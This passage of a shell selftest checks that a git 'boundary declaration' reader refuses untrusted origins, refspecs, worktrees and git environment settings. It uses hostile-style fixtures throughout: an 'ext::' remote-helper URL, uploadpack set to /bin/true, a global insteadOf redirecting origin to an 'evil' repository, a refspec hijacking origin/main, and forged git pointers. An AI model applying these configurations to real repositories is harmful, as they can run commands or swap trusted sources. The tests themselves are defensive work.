      *"declaration UNTRUSTED ("*"$2"*"). Remedy: "*"$3"*) if [ "$_ut_rc" -eq 1 ]; then echo "PASS: untrusted [$1] reads UNTRUSTED with its remedy and exits 1 from a terminal"; else echo "FAIL: untrusted [$1] exited $_ut_rc, expected 1 ($_ut_out)"; fail=1; fi ;;
      *) echo "FAIL: untrusted [$1] did not print the UNTRUSTED line with '$2' and the remedy '$3' ($_ut_out)"; fail=1 ;;
    esac
    _bnd_run "$_self" "--boundary-only --boundary-advisory"
    case "$_br_out" in
      *"declaration UNTRUSTED ("*) if [ "$_br_rc" -eq 0 ]; then echo "PASS: untrusted [$1] --boundary-advisory keeps the line and exits 0"; else echo "FAIL: untrusted [$1] exited $_br_rc under --boundary-advisory"; fail=1; fi ;;
      *) echo "FAIL: untrusted [$1] the advisory run lost the UNTRUSTED line ($_br_out)"; fail=1 ;;
    esac
    _g_ci=1; _bnd_run "$_self" "--boundary-only"; _g_ci=""
    case "$_br_out" in
      *"declaration UNTRUSTED"*) echo "FAIL: untrusted [$1] CI read the declaration ($_br_out)"; fail=1 ;;
      *) if [ "$_br_rc" -ne 1 ]; then echo "PASS: untrusted [$1] under CI the declaration is not read and the exit is not 1 (exit $_br_rc)"; else echo "FAIL: untrusted [$1] CI exited 1 ($_br_out)"; fail=1; fi ;;
    esac
  }
  # the REAL origin reader against local bare repositories (no network). A declaration is read from origin's default branch, never the working tree.
  _og=$(mktemp -d); _gx='-c user.name=kit -c user.email=kit@example.invalid -c commit.gpgsign=false -c core.hooksPath=/dev/null'
  git init -q --bare "$_og/origin.git"; git -C "$_og/origin.git" symbolic-ref HEAD refs/heads/main
  git init -q "$_og/work"; git -C "$_og/work" symbolic-ref HEAD refs/heads/main; git -C "$_og/work" remote add origin "$_og/origin.git"
  printf 'x\n' > "$_og/work/f"; printf 'Engineering Principles & Definition of Done\n' > "$_og/work/CLAUDE.md"; git -C "$_og/work" add f CLAUDE.md   # SWAS-784: an export-shaped root (and so every clone of origin), or the real body refuses the fixture as no project
  # shellcheck disable=SC2086  # $_gx is a fixed flag list
  git -C "$_og/work" $_gx commit -q -m base; git -C "$_og/work" push -q origin main 2>/dev/null
  _g_decl=real; _g_dir="$_og/work"
  mkdir -p "$_og/work/.kit"; cp "$_bnd/d-all.conf" "$_og/work/.kit/boundary-optout.conf"   # present in the WORKING TREE only (untracked)
  _bnd_run "$_self" "--boundary-only --boundary-advisory"
  case "$_br_out" in
    *"OFF and UNDECLARED"*) echo "PASS: origin reader [working-tree-ignored] an untracked working-tree declaration declares nothing" ;;
    *) echo "FAIL: origin reader [working-tree-ignored] the working-tree declaration was read ($_br_out)"; fail=1 ;;
  esac
  git -C "$_og/work" add .kit/boundary-optout.conf
  # shellcheck disable=SC2086
  git -C "$_og/work" $_gx commit -q -m decl; git -C "$_og/work" push -q origin main 2>/dev/null
  _bnd_run "$_self" "--boundary-only --boundary-advisory"
  case "$_br_out" in
    *"(opted out 2026-10-23, declared in .kit/boundary-optout.conf)"*) echo "PASS: origin reader [declared-on-origin] a declaration committed to origin's default branch declares the part" ;;
    *) echo "FAIL: origin reader [declared-on-origin] the committed declaration was not read ($_br_out)"; fail=1 ;;
  esac
  rm -f "$_og/work/.kit/boundary-optout.conf"; ln -s /etc/hostname "$_og/work/.kit/boundary-optout.conf"
  git -C "$_og/work" add -f .kit/boundary-optout.conf
  # shellcheck disable=SC2086
  git -C "$_og/work" $_gx commit -q -m symlink; git -C "$_og/work" push -q origin main 2>/dev/null
  _bnd_run "$_self" "--boundary-only --boundary-advisory"
  case "$_br_out" in
    *"declaration MALFORMED (.kit/boundary-optout.conf: the entry on origin's default branch is not a regular file)"*) echo "PASS: origin reader [symlink-is-malformed] a symlink at the declaration path on origin is MALFORMED, never absent" ;;
    *) echo "FAIL: origin reader [symlink-is-malformed] a symlinked declaration was not refused ($_br_out)"; fail=1 ;;
  esac
  # S4: a blob far over the cap (and over the pipe buffer, so git sees SIGPIPE) is read only to 4097 bytes and is MALFORMED (over 4 KiB), not unreadable
  git -C "$_og/work" rm -q -f .kit/boundary-optout.conf
  mkdir -p "$_og/work/.kit"
  { printf '# '; head -c 300000 /dev/zero | tr '\0' 'x'; printf '\npart=all reason=r lost=l since=2026-10-23\n'; } > "$_og/work/.kit/boundary-optout.conf"
  git -C "$_og/work" add -f .kit/boundary-optout.conf
  # shellcheck disable=SC2086
  git -C "$_og/work" $_gx commit -q -m big; git -C "$_og/work" push -q origin main 2>/dev/null
  _bnd_run "$_self" "--boundary-only --boundary-advisory"
  case "$_br_out" in
    *"declaration MALFORMED"*"the file is over 4 KiB"*) echo "PASS: origin reader [oversize-blob] a 300 KB blob on origin (git is cut off by the 4097-byte read) is MALFORMED (over 4 KiB)" ;;
    *) echo "FAIL: origin reader [oversize-blob] ($_br_out)"; fail=1 ;;
  esac
  _bnd_kill oversize-cap-removed '/MUT-HEADCAP/d' "--boundary-only --boundary-advisory" has 'the file is over 4 KiB'
  git -C "$_og/work" rm -q -f .kit/boundary-optout.conf
  # shellcheck disable=SC2086
  git -C "$_og/work" $_gx commit -q -m gone; git -C "$_og/work" push -q origin main 2>/dev/null
  git clone -q "$_og/origin.git" "$_og/late" 2>/dev/null
  # the moved-tip clones (owner ruling "Let's go with your recommendation on three"): taken BEFORE origin moves on, so origin's tip is not fetched in any of them
  git clone -q "$_og/origin.git" "$_og/late2" 2>/dev/null; git clone -q "$_og/origin.git" "$_og/late3" 2>/dev/null; git clone -q "$_og/origin.git" "$_og/late4" 2>/dev/null
  git clone -q "$_og/origin.git" "$_og/late5" 2>/dev/null; git clone -q "$_og/origin.git" "$_og/late6" 2>/dev/null; git clone -q "$_og/origin.git" "$_og/late7" 2>/dev/null
  printf 'y\n' > "$_og/work/g"; git -C "$_og/work" add g
  # shellcheck disable=SC2086
  git -C "$_og/work" $_gx commit -q -m ahead; git -C "$_og/work" push -q origin main 2>/dev/null
  _g_dir="$_og/late"
  _bnd_run "$_self" "--boundary-only --boundary-advisory"
  case "$_br_out" in
    *"OFF and UNDECLARED"*"last fetched "*"; origin has moved]"*"origin has moved: git fetch origin, then re-run"*) echo "PASS: origin reader [tip-moved-undeclared] a moved tip is judged from the remote-tracking ref (an OFF part, no declaration there): FAIL, labelled 'origin has moved'" ;;
    *) echo "FAIL: origin reader [tip-moved-undeclared] ($_br_out)"; fail=1 ;;
  esac
  _bnd_exit moved-tip-undeclared-gates yes   # judged from the last fetch, it gates exactly as usual
  # PASS case: the tracking ref of late2 holds a declaration (a locally written ref is trusted until the next fetch: the stated residual)
  git -C "$_og/late2" checkout -q -b tmpd 2>/dev/null; mkdir -p "$_og/late2/.kit"; cp "$_bnd/d-all.conf" "$_og/late2/.kit/boundary-optout.conf"
  git -C "$_og/late2" add -f .kit/boundary-optout.conf
  # shellcheck disable=SC2086
  git -C "$_og/late2" $_gx commit -q -m decl; git -C "$_og/late2" update-ref refs/remotes/origin/main HEAD
  _g_dir="$_og/late2"
  _bnd_run "$_self" "--boundary-only"
  case "$_br_out" in
    *"(opted out 2026-10-23, declared in .kit/boundary-optout.conf)"*"origin has moved"*|*"origin has moved"*"opted out 2026-10-23"*) if [ "$_br_rc" -eq 0 ]; then echo "PASS: origin reader [tip-moved-declared] a moved tip is judged from the tracking ref: the declared part passes (exit 0), labelled 'origin has moved'"; else echo "FAIL: origin reader [tip-moved-declared] exit $_br_rc ($_br_out)"; fail=1; fi ;;
    *) echo "FAIL: origin reader [tip-moved-declared] ($_br_out)"; fail=1 ;;
  esac
  _bnd_kill tip-fallback-call-dropped '/MUT-TIPCALL/s/boundary_tip_unfetched.*return \$?/:/' "--boundary-only" has 'origin has moved]'
  _bnd_kill tracking-ref-fallback-removed '/MUT-TRACKING/s/_bo_tip=\$_bt_loc/return 3/' "--boundary-only" has 'origin has moved]'
  # no tracking ref at all: UNVERIFIED with the fetch remedy (gates, "B revised")
  git -C "$_og/late3" update-ref -d refs/remotes/origin/main; _g_dir="$_og/late3"
  _bnd_run "$_self" "--boundary-only"
  case "$_br_out" in
    *"FAIL boundary: declaration UNVERIFIED ("*"no remote-tracking ref"*") while a part is OFF. Remedy: git fetch origin, then re-run"*) if [ "$_br_rc" -eq 1 ]; then echo "PASS: origin reader [no-tracking-ref] no tracking ref reads UNVERIFIED with the fetch remedy and no --boundary-offline advice (exit 1)"; else echo "FAIL: origin reader [no-tracking-ref] exit $_br_rc"; fail=1; fi ;;
    *) echo "FAIL: origin reader [no-tracking-ref] ($_br_out)"; fail=1 ;;
  esac
  case "$_br_out" in
    *"--boundary-offline"*) echo "FAIL: origin reader [no-tracking-ref] the fetch remedy also advised --boundary-offline ($_br_out)"; fail=1 ;;
    *) echo "PASS: origin reader [no-tracking-ref] the tip's remedy does not advise --boundary-offline" ;;
  esac
  _bnd_kill no-tracking-ref-treated-as-pass '/MUT-NOREF/s/return 3 ;;/return 0 ;;/' "--boundary-only" has 'Remedy: git fetch origin, then re-run'
  _bnd_kill remedy-text-tip-dropped 's/tip) printf .%s. "git fetch origin, then re-run" ;;/tip) printf "%s" "retry when online, or type --boundary-offline" ;;/' "--boundary-only" has 'Remedy: git fetch origin, then re-run'
  # an excluding / foreign fetch refspec: UNTRUSTED
  git -C "$_og/late4" config --add remote.origin.fetch '^refs/heads/main'; _g_dir="$_og/late4"
  _ut excluding-refspec "remote.origin.fetch does not fetch origin's default branch" "restore the default fetch refspec: git config remote.origin.fetch '+refs/heads/*:refs/remotes/origin/*'"
  _bnd_kill refspec-check-dropped '/MUT-REFSPEC/s/if \[ "\$_bt_ok" -eq 0 \] || \[ "\$_bt_neg" -eq 1 \]; then/if false; then/' "--boundary-only" has 'declaration UNTRUSTED'
  # S31: a negative refspec counts only when it matches the default branch; an unrelated one leaves the tracking-ref read in place
  git -C "$_og/late5" config --add remote.origin.fetch '^refs/heads/wip'; _g_dir="$_og/late5"
  _bnd_run "$_self" "--boundary-only --boundary-advisory"
  case "$_br_out" in
    *"declaration UNTRUSTED"*) echo "FAIL: s31 [unrelated-negative-refspec] an unrelated ^refs/heads/wip read UNTRUSTED ($_br_out)"; fail=1 ;;
    *"origin has moved]"*) echo "PASS: s31 [unrelated-negative-refspec] an unrelated ^refs/heads/wip passes (judged from the tracking ref)" ;;
    *) echo "FAIL: s31 [unrelated-negative-refspec] ($_br_out)"; fail=1 ;;
  esac
  git -C "$_og/late5" config --add remote.origin.fetch '^refs/heads/ma*'; _g_dir="$_og/late5"
  _ut covering-glob-refspec "remote.origin.fetch does not fetch origin's default branch" "restore the default fetch refspec"
  # S29: a local branch (and the tracking ref) names origin's tip while the tip's loose object is deleted: the absence is local damage, UNTRUSTED, never the fallback
  _s29t=$(git -C "$_og/work" rev-parse main)
  git -C "$_og/late6" fetch -q origin 2>/dev/null; git -C "$_og/late6" branch tipb origin/main 2>/dev/null
  rm -f "$_og/late6/.git/objects/${_s29t%"${_s29t#??}"}/${_s29t#??}"; _g_dir="$_og/late6"
  _ut tip-object-missing "a local ref names origin's tip but its object is missing" "a local ref names origin's tip but its object is missing; run git fetch origin"
  _bnd_kill tip-object-missing-check-dropped '/MUT-TIPMISSING/s/^ *\*.*)/    __never__)/' "--boundary-only --boundary-advisory" has 'declaration UNTRUSTED'
  # S38: an extra positive refspec that maps a non-default source onto the default branch's tracking ref is UNTRUSTED (the default refspec is still present)
  git -C "$_og/late7" config --add remote.origin.fetch '+refs/heads/evil:refs/remotes/origin/main'; _g_dir="$_og/late7"
  _ut foreign-source-refspec "remote.origin.fetch does not fetch origin's default branch" "restore the default fetch refspec"
  _bnd_kill foreign-source-refspec-check-dropped '/S38: an extra refspec/d' "--boundary-only --boundary-advisory" has 'declaration UNTRUSTED'
  # S32: stderr counts as a terminal (the real test, not the seam)
  if grep -qF '[ -t 0 ] || [ -t 1 ] || [ -t 2 ]' "$_self" && grep -qF '[ -t 0 ] || [ -t 1 ] || [ -t 2 ]' "$_sd/doctor-boundary.sh"; then echo "PASS: s32 [tty-counts-stderr] boundary_has_tty and _db_tty test stdin, stdout and stderr"; else echo "FAIL: s32 [tty-counts-stderr] a TTY test does not cover stderr"; fail=1; fi
  # a not-own-root directory and a redirected git environment get their own remedies (S27)
  mkdir -p "$_og/work/nest"; _g_dir="$_og/work/nest"
  _bnd_run "$_self" "--boundary-only --allow-nested"
  case "$_br_out" in
    *"declaration UNVERIFIED ("*"not the root of its own git repository"*"Remedy: run preflight from the repository root"*) echo "PASS: s27 [not-own-root --allow-nested] a nested directory reads UNVERIFIED with the run-from-the-root remedy" ;;
    *) echo "FAIL: s27 [not-own-root --allow-nested] ($_br_out)"; fail=1 ;;
  esac
  # SWAS-358 / SWAS-487: the case-variant cell (st_case_variant, defined at the top of the selftest block) builds its own fixture, so the lane can run it alone.
  st_case_variant   # MUT-CVFULL
  git init -q "$_og/noorigin"; _g_dir="$_og/noorigin"
  _bnd_run "$_self" "--boundary-only --boundary-advisory"
  case "$_br_out" in
    *"declaration UNTRUSTED"*"no origin remote"*) echo "PASS: origin reader [no-origin] no origin remote reads UNTRUSTED (Architect ruling), never a pass" ;;
    *) echo "FAIL: origin reader [no-origin] ($_br_out)"; fail=1 ;;
  esac
  _ut no-origin "no origin remote" "add your forge as origin: git remote add origin '<your forge URL>'"
  _bnd_kill no-origin-mapped-to-unverified '/MUT-CLASS/s/|no-origin|fetch-refspec|tip-object-missing) echo UNTRUSTED/|fetch-refspec|tip-object-missing) echo UNTRUSTED/' "--boundary-only --boundary-advisory" has 'declaration UNTRUSTED'
  _g_dir="$_og/work"; _g_env="GIT_DIR=$_og/work/.git"
  _bnd_run "$_self" "--boundary-only --boundary-advisory"
  case "$_br_out" in
    *"declaration UNVERIFIED"*"git environment is redirected"*"Remedy: unset GIT_DIR and GIT_WORK_TREE"*) echo "PASS: origin reader [redirected-git-env] a GIT_DIR redirect never reads a foreign origin, and the remedy is to unset GIT_DIR and GIT_WORK_TREE" ;;
    *) echo "FAIL: origin reader [redirected-git-env] ($_br_out)"; fail=1 ;;
  esac
  _g_env=""
  # S1: an effective origin URL that is not the one this repository stores (url.*.insteadOf from a GLOBAL config, here a fixture HOME and never the real user config)
  # is another repository's origin: the reader refuses it, and the evil repository below holds a declaration that would otherwise read as DECLARED.
  _ev_r="$_og/evil.git"
  git -C "$_og/work" checkout -q -b evilb 2>/dev/null; mkdir -p "$_og/work/.kit"; cp "$_bnd/d-all.conf" "$_og/work/.kit/boundary-optout.conf"
  git -C "$_og/work" add -f .kit/boundary-optout.conf
  # shellcheck disable=SC2086
  git -C "$_og/work" $_gx commit -q -m evil
  git init -q --bare "$_ev_r"; git -C "$_ev_r" symbolic-ref HEAD refs/heads/main; git -C "$_og/work" push -q "$_ev_r" evilb:main 2>/dev/null
  git -C "$_og/work" checkout -q -f main; git -C "$_og/work" branch -q -D evilb
  mkdir -p "$_og/home"; printf '[url "%s"]\n\tinsteadOf = %s\n' "$_ev_r" "$_og/origin.git" > "$_og/home/.gitconfig"
  _g_home="$_og/home"; _g_dir="$_og/work"; _g_decl=real
  _bnd_run "$_self" "--boundary-only --boundary-advisory"
  case "$_br_out" in
    *"declaration UNTRUSTED"*"effective origin URL differs"*) echo "PASS: origin reader [global-insteadof] a global url.*.insteadOf that rewrites origin reads UNTRUSTED, never the rewritten repository's declaration" ;;
    *) echo "FAIL: origin reader [global-insteadof] ($_br_out)"; fail=1 ;;
  esac
  _ut url-rewrite "effective origin URL differs" "remove that rule"
  _bnd_exit url-rewrite-untrusted yes
  case "$_br_out" in
    *"declared in .kit/boundary-optout.conf"*) echo "FAIL: origin reader [global-insteadof] the rewritten repository's declaration was read"; fail=1 ;;
    *) echo "PASS: origin reader [global-insteadof] no declaration was taken from the rewritten repository" ;;
  esac
  _bnd_kill origin-url-check-deleted '/MUT-URLDIFF/d' "--boundary-only --boundary-advisory" has 'effective origin URL differs'
  _g_home=""
  for _ev_w in GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null GIT_CONFIG_COUNT=0 "GIT_CONFIG_PARAMETERS='a.b'='c'" "GIT_COMMON_DIR=$_og/work/.git" "GIT_OBJECT_DIRECTORY=$_og/work/.git/objects" "GIT_EXEC_PATH=$(git --exec-path)"; do
    _g_env=$_ev_w
    _bnd_run "$_self" "--boundary-only --boundary-advisory"
    case "$_br_out" in
      *"declaration UNTRUSTED"*"${_ev_w%%=*} is set"*) echo "PASS: origin reader [env-${_ev_w%%=*}] a set ${_ev_w%%=*} reads UNTRUSTED" ;;
      *) echo "FAIL: origin reader [env-${_ev_w%%=*}] ($_br_out)"; fail=1 ;;
    esac
    case "$_br_out" in
      *"$_og"*) echo "FAIL: origin reader [env-${_ev_w%%=*}] the variable's VALUE was printed ($_br_out)"; fail=1 ;;
      *) echo "PASS: origin reader [env-${_ev_w%%=*}] only the variable name is printed, never its value" ;;
    esac
    _ut "env-${_ev_w%%=*}" "${_ev_w%%=*} is set" "unset ${_ev_w%%=*} "
  done
  _g_env=GIT_CONFIG_GLOBAL=/dev/null
  _bnd_kill origin-env-check-deleted '/MUT-ENVSET/d' "--boundary-only --boundary-advisory" has 'GIT_CONFIG_GLOBAL is set'
  _g_env=""
  # S8: the harness unsets the seven variables, so a CI face that exports them (selftest-hermetic) cannot turn every real-reader cell UNVERIFIED (I1)
  _g_env=""; _g_dir="$_og/work"; _g_decl=real
  _i1=$( GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null GIT_CONFIG_COUNT=0; export GIT_CONFIG_GLOBAL GIT_CONFIG_SYSTEM GIT_CONFIG_COUNT
    _bnd_run "$_self" "--boundary-only --boundary-advisory"; printf '%s' "$_br_out" )
  case "$_i1" in
    *"declaration UNVERIFIED"*|*"declaration UNTRUSTED"*) echo "FAIL: origin reader [harness-unsets-env] ambient GIT_CONFIG_* variables leaked into the run ($_i1)"; fail=1 ;;
    *"OFF and UNDECLARED"*) echo "PASS: origin reader [harness-unsets-env] the harness unsets the ambient GIT_CONFIG_* variables, so a real-reader cell still reads origin" ;;
    *) echo "FAIL: origin reader [harness-unsets-env] ($_i1)"; fail=1 ;;
  esac
  # S8: a local-path or file:// effective origin, and a set remote.origin.uploadpack or .vcs in ANY scope, read UNVERIFIED (fixtures live in temp repos and a temp HOME only).
  _g_env=PREFLIGHT_BOUNDARY_REFUSE_LOCAL=1
  _bnd_run "$_self" "--boundary-only --boundary-advisory"
  case "$_br_out" in
    *"declaration UNTRUSTED"*"local path or a file:// URL"*) echo "PASS: origin reader [local-path-origin] a local-path origin reads UNTRUSTED" ;;
    *) echo "FAIL: origin reader [local-path-origin] ($_br_out)"; fail=1 ;;
  esac
  _ut local-path "local path or a file:// URL" "origin must be a network forge URL (https or ssh); this check can't verify a local or unrecognised origin"
  # the Architect's bypass: `git remote set-url origin <local bare>` makes stored equal effective, and the local form must still FAIL
  git -C "$_og/work" remote set-url origin "$_og/origin.git"
  _bnd_run "$_self" "--boundary-only"
  case "$_br_out" in
    *"declaration UNTRUSTED"*"local path or a file:// URL"*) if [ "$_br_rc" -eq 1 ]; then echo "PASS: origin reader [set-url-local-bare-fails] set-url origin to a local bare repository FAILs (exit 1)"; else echo "FAIL: origin reader [set-url-local-bare-fails] exit $_br_rc"; fail=1; fi ;;
    *) echo "FAIL: origin reader [set-url-local-bare-fails] ($_br_out)"; fail=1 ;;
  esac
  _bnd_kill local-path-check-deleted '/MUT-LOCALPATH/d' "--boundary-only --boundary-advisory" has 'local path or a file:// URL'
  git -C "$_og/work" remote set-url origin "file://$_og/origin.git"
  _bnd_run "$_self" "--boundary-only --boundary-advisory"
  case "$_br_out" in
    *"declaration UNTRUSTED"*"local path or a file:// URL"*) echo "PASS: origin reader [file-url-origin] a file:// origin reads UNTRUSTED" ;;
    *) echo "FAIL: origin reader [file-url-origin] ($_br_out)"; fail=1 ;;
  esac
  _ut file-url "local path or a file:// URL" "origin must be a network forge URL (https or ssh); this check can't verify a local or unrecognised origin"
  git -C "$_og/work" remote set-url origin "ssh://git@127.0.0.1:1/x.git"
  _bnd_run "$_self" "--boundary-only --boundary-advisory"
  case "$_br_out" in
    *"local path or a file:// URL"*) echo "FAIL: origin reader [remote-url-not-local] an ssh:// origin was refused as a local path ($_br_out)"; fail=1 ;;
    *"declaration UNVERIFIED"*) echo "PASS: origin reader [remote-url-not-local] an ssh:// origin is not refused as local (it is unreadable here)" ;;
    *) echo "FAIL: origin reader [remote-url-not-local] ($_br_out)"; fail=1 ;;
  esac
  _bnd_exit network-failure-gates-when-a-part-is-off yes   # S20 ("355a: B revised"): a network failure is UNVERIFIED, not UNTRUSTED, but with a part OFF it gates from a terminal
  # N4: scp-like and https remotes are not refused as local or as a remote helper either
  for _ou in 'git@127.0.0.1:x.git' 'https://127.0.0.1:1/x.git'; do
    git -C "$_og/work" remote set-url origin "$_ou"
    _bnd_run "$_self" "--boundary-only --boundary-advisory"
    case "$_br_out" in
      *"local path or a file:// URL"*|*"remote-helper or unrecognised URL form"*) echo "FAIL: origin reader [remote-url-not-local] $_ou was refused as local or as a helper ($_br_out)"; fail=1 ;;
      *"declaration UNVERIFIED"*) echo "PASS: origin reader [remote-url-not-local] $_ou is classed as a remote (it is unreadable here)" ;;
      *) echo "FAIL: origin reader [remote-url-not-local] $_ou ($_br_out)"; fail=1 ;;
    esac
  done
  # S13 / N3: default-deny: a remote-helper (::) or unrecognised form reads UNVERIFIED with its own reason, and no ls-remote runs it
  for _ou in 'ext::git-upload-pack /x' 'foo::bar' 'foo://x/y'; do
    git -C "$_og/work" remote set-url origin "$_ou"
    _bnd_run "$_self" "--boundary-only --boundary-advisory"
    case "$_br_out" in
      *"declaration UNTRUSTED"*"remote-helper or unrecognised URL form"*) echo "PASS: origin reader [remote-helper-origin] '$_ou' reads UNTRUSTED as a remote-helper or unrecognised form" ;;
      *) echo "FAIL: origin reader [remote-helper-origin] '$_ou' ($_br_out)"; fail=1 ;;
    esac
    _ut "remote-helper $_ou" "remote-helper or unrecognised URL form" "origin must be a network forge URL (https or ssh); this check can't verify a local or unrecognised origin"
  done
  git -C "$_og/work" remote set-url origin 'ext::git-upload-pack /x'
  _bnd_kill remote-helper-check-deleted '/MUT-HELPER/d' "--boundary-only --boundary-advisory" has 'remote-helper or unrecognised URL form'
  git -C "$_og/work" remote set-url origin "$_og/origin.git"
  _g_env=""
  git -C "$_og/work" config remote.origin.uploadpack /bin/true
  _bnd_run "$_self" "--boundary-only --boundary-advisory"
  case "$_br_out" in
    *"declaration UNTRUSTED"*"remote.origin.uploadpack or remote.origin.vcs is set"*) echo "PASS: origin reader [uploadpack-set] a set remote.origin.uploadpack reads UNTRUSTED" ;;
    *) echo "FAIL: origin reader [uploadpack-set] ($_br_out)"; fail=1 ;;
  esac
  _ut uploadpack "remote.origin.uploadpack or remote.origin.vcs is set" "git config --unset remote.origin.uploadpack"
  # SWAS-474 R1: egress undeclared plus an UNTRUSTED declaration (the uploadpack just set): the summary's strict step first, today's sentence after it (the UNTRUSTED site sets _bnd_nonegress)
  mkdir -p "$_bnd/emptyhome"
  bnd_sum "$_bnd/full.json" "$_bnd/user-plain.json" real "$_og/work" "$_bnd/emptyhome" keep
  case "$out" in
    *"declaration UNTRUSTED"*) : ;;
    *) echo "FAIL: swas-474 [summary-mixed-untrusted] the scenario is vacuous (no UNTRUSTED declaration was read, so the UNTRUSTED site is not what set the flag): $out"; fail=1 ;;
  esac
  case "$out" in
    *"egress is not enforced"*"$_e4_old"*) echo "PASS: swas-474 [summary-mixed-untrusted] egress plus an UNTRUSTED declaration: the strict step first, today's sentence after it" ;;
    *) echo "FAIL: swas-474 [summary-mixed-untrusted] ($out)"; fail=1 ;;
  esac
  _bnd_kill uploadpack-check-deleted '/MUT-UPLOADPACK/d' "--boundary-only --boundary-advisory" has 'remote.origin.uploadpack or remote.origin.vcs is set'
  git -C "$_og/work" config --unset remote.origin.uploadpack
  git -C "$_og/work" config remote.origin.vcs nothing
  _bnd_run "$_self" "--boundary-only --boundary-advisory"
  case "$_br_out" in
    *"declaration UNTRUSTED"*"remote.origin.uploadpack or remote.origin.vcs is set"*) echo "PASS: origin reader [vcs-set] a set remote.origin.vcs reads UNTRUSTED" ;;
    *) echo "FAIL: origin reader [vcs-set] ($_br_out)"; fail=1 ;;
  esac
  _ut vcs "remote.origin.uploadpack or remote.origin.vcs is set" "git config --unset remote.origin.vcs"
  git -C "$_og/work" config --unset remote.origin.vcs
  mkdir -p "$_og/home2"; printf '[remote "origin"]\n\tuploadpack = /bin/true\n' > "$_og/home2/.gitconfig"
  _g_home="$_og/home2"
  _bnd_run "$_self" "--boundary-only --boundary-advisory"
  case "$_br_out" in
    *"declaration UNTRUSTED"*"remote.origin.uploadpack or remote.origin.vcs is set"*) echo "PASS: origin reader [uploadpack-global] a remote.origin.uploadpack in the global scope reads UNTRUSTED" ;;
    *) echo "FAIL: origin reader [uploadpack-global] ($_br_out)"; fail=1 ;;
  esac
  _g_home=""
  # S10 (D-241026-2 amended): a REAL linked worktree is trusted (git's back-links agree) and reads the common dir's origin; a symlinked .git or a forged pointer is UNTRUSTED.
  _gd_rem="run it from the repository's own main worktree or a real 'git worktree add' checkout"
  git -C "$_og/work" worktree add -q -b wtb "$_og/wt" 2>/dev/null
  _g_dir="$_og/wt"
  _bnd_run "$_self" "--boundary-only --boundary-advisory"
  case "$_br_out" in
    *UNTRUSTED*) echo "FAIL: origin reader [worktree-trusted] a real linked worktree was refused ($_br_out)"; fail=1 ;;
    *"OFF and UNDECLARED"*) echo "PASS: origin reader [worktree-trusted] a real 'git worktree add' checkout is trusted and reads origin from the common dir" ;;
    *) echo "FAIL: origin reader [worktree-trusted] ($_br_out)"; fail=1 ;;
  esac
  mkdir -p "$_og/forged"; printf 'gitdir: %s\n' "$_og/work/.git/worktrees/wt" > "$_og/forged/.git"   # a pointer at a real worktree entry whose gitdir file names another directory
  _g_dir="$_og/forged"
  _ut forged-worktree-pointer "git directory is outside this tree" "$_gd_rem"
  _bnd_kill worktree-backlink-broken '/MUT-BACKLINK/s/\[ "\$_gt_bp" = "\$_gt_me" \]/:/;/real admin entry is always listed/s/\[ "\$_gt_hit" = y \]/:/' "--boundary-only --boundary-advisory" has 'git directory is outside this tree'
  _bnd_kill git-dir-outside-check-deleted '/MUT-GITDIR/d' "--boundary-only --boundary-advisory" has 'git directory is outside this tree'
  mkdir -p "$_og/work/.git/worktrees/fake" "$_og/forgedwt"; printf '%s\n' "$_og/forgedwt/.git" > "$_og/work/.git/worktrees/fake/gitdir"; printf 'gitdir: %s\n' "$_og/work/.git/worktrees/fake" > "$_og/forgedwt/.git"   # a hand-made admin entry whose back-link agrees but that git itself does not accept as a worktree
  _g_dir="$_og/forgedwt"; _bnd_run "$_self" "--boundary-only --boundary-advisory"
  case "$_br_out" in
    *"declaration UNVERIFIED"*|*"declaration UNTRUSTED"*) echo "PASS: origin reader [forged-admin-entry] a hand-made worktree entry reads no declaration (a complete forgery is the drift-control residual)" ;;
    *"declared in .kit/boundary-optout.conf"*) echo "FAIL: origin reader [forged-admin-entry] a hand-made worktree entry was read ($_br_out)"; fail=1 ;;
    *) echo "FAIL: origin reader [forged-admin-entry] ($_br_out)"; fail=1 ;;
  esac
  mkdir -p "$_og/forged2"; printf 'gitdir: %s\n' "$_og/work/.git" > "$_og/forged2/.git"   # a pointer at a main git dir, no worktrees entry at all
  _g_dir="$_og/forged2"
  _ut forged-pointer-no-backlink "git directory is outside this tree" "$_gd_rem"
  mkdir -p "$_og/forged3"; ln -s "$_og/work/.git" "$_og/forged3/.git"   # a symlinked .git
  _g_dir="$_og/forged3"
  _ut symlinked-dot-git "git directory is outside this tree" "$_gd_rem"
  git -C "$_og/work" worktree remove --force "$_og/wt" 2>/dev/null
  # I2: a BARE common dir plus a linked worktree (`git clone --bare` + `git worktree add`, and the `.bare` layout) is trusted; a common dir that is neither <root>/.git nor bare is not.
  git clone -q --bare "$_og/origin.git" "$_og/bare.git" 2>/dev/null
  git -C "$_og/bare.git" worktree add -q "$_og/bwt" main 2>/dev/null
  mkdir -p "$_og/bl"; git clone -q --bare "$_og/origin.git" "$_og/bl/.bare" 2>/dev/null; printf 'gitdir: ./.bare\n' > "$_og/bl/.git"
  git -C "$_og/bl" worktree add -q "$_og/bl/main" main 2>/dev/null
  for _bw in "$_og/bwt" "$_og/bl/main"; do
    _g_dir="$_bw"; _bnd_run "$_self" "--boundary-only --boundary-advisory"
    case "$_br_out" in
      *UNTRUSTED*) echo "FAIL: origin reader [bare-worktree-trusted] ${_bw#"$_og"/} was refused ($_br_out)"; fail=1 ;;
      *"OFF and UNDECLARED"*) echo "PASS: origin reader [bare-worktree-trusted] ${_bw#"$_og"/} (a bare common dir plus a linked worktree) is trusted and reads origin from the common dir" ;;
      *) echo "FAIL: origin reader [bare-worktree-trusted] ${_bw#"$_og"/} ($_br_out)"; fail=1 ;;
    esac
  done
  _bnd_gain() {  # <name> <sed expr> <flags> <substring>: the ORIGINAL must not print it and the mutant must (a mutant that breaks a trust path gains an UNTRUSTED line)
    _bk=$(mktemp -d); sed "$2" "$_self" > "$_bk/preflight.sh"
    if cmp -s "$_self" "$_bk/preflight.sh"; then echo "FAIL: mutant $1 did not apply (the sed expression matched nothing)"; fail=1; rm -rf "$_bk"; return 0; fi
    if ! sh -n "$_bk/preflight.sh" 2>/dev/null; then echo "FAIL: mutant $1 does not parse"; fail=1; rm -rf "$_bk"; return 0; fi
    _bnd_run "$_self" "$3"
    case "$_br_out" in
      *"$4"*) _bg_o=1 ;;
      *) _bg_o=0 ;;
    esac
    _bnd_run "$_bk/preflight.sh" "$3"
    case "$_br_out" in
      *"$4"*) _bg_m=1 ;;
      *) _bg_m=0 ;;
    esac
